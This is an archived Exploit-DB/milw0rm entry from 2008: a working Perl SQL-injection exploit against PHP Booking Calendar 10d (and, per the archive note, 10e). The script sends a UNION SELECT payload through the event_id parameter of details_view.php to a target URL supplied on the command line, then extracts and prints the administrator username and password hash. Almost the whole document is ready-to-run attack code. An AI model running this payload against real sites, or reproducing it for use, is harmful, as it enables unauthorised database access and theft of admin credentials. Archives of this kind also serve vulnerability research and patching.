# Portal   :PHP Booking Calendar 10 d (sql/upload) Exploit
# Modified 2008
# Download :  https://sourceforge.net/project/showfiles.php?group_id=132702
# exploit aported password  crypted
########################################
#[*] Founded &  Exploited by : Stack
#[*] Contact: Ev!L =>> see down
#[*] Greetz : Houssamix & Djekmani & Jadi & iuoisn & Str0ke & All muslims HaCkeRs  :)
################################################################################
# Exploit-DB Note (May 28th 2012)
# PHP Booking Calendar 10e is also affected by this
#
#
#!/usr/bin/perl -w
########################################
# * TITLE:          PerlSploit Class
# * REQUIREMENTS:   PHP 4 / PHP 5
# * VERSION:        v.1
# * LICENSE:        GNU General Public License
# * ORIGINAL URL:   http://www.v4-Team/v4.txt
# * FILENAME:       PerlSploitClass.pl
# *
# * CONTACT:       Wanted :
# * THNX : AllaH
# * GREETZ:         Houssamix & Djekmani
########################################
#----------------------------------------------------------------------------#
########################################
system(\"color 02\");
print \"\\t\\t############################################################\\n\\n\";
print \"\\t\\t#   PHP Booking Calendar 10 d - Remote SQL Inj Exploit     #\\n\\n\";
print \"\\t\\t#                         by Stack                         #\\n\\n\";
print \"\\t\\t############################################################\\n\\n\";
########################################
#----------------------------------------------------------------------------#
########################################
use LWP::UserAgent;
die \"Example: perl $0 http://victim.com/path/\\n\" unless @ARGV;
system(\"color f\");
########################################
#----------------------------------------------------------------------------#
########################################
#the username of  news manages
$user=\"username\";
#the pasword of  news manages
$pass=\"passwd\";
#the tables of news manages
$tab=\"booking_user\";
$fil=\"details_view.php\";
$varo=\"event_id\";
########################################
#----------------------------------------------------------------------------#
########################################
$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";
$b->agent(\'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\');
########################################
#----------------------------------------------------------------------------#
########################################
$host = $ARGV[0] . \"/\".$fil.\"?\".$varo.\"=-1+union+all+select+1,1,concat_ws(char(58),char(58),\".$user.\",char(58),char(58),char(58),char(58)),1,1,1,1,1,1,\".$pass.\",1,1,1 from+\".$tab.\"/*\";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;
########################################
#----------------------------------------------------------------------------#
########################################
if ($answer =~ /::(.*?)::::/){
        print \"\\nBrought to you by v4-team.com...\\n\";
        print \"\\n[+] Admin User : $1\";
}
########################################
#----------------------------------------------------------------------------#
########################################
if ($answer =~/([0-9a-fA-F]{32})/){print \"\\n[+] Admin Hash : $1\\n\\n\";
print \"\\t\\t#   Exploit has ben aported user and password hash   #\\n\\n\";}
else{print \"\\n[-] Exploit Failed...\\n\";}
########################################
#-------------------Exploit exploited by Stack --------------------#
########################################

# milw0rm.com [2008-05-29]
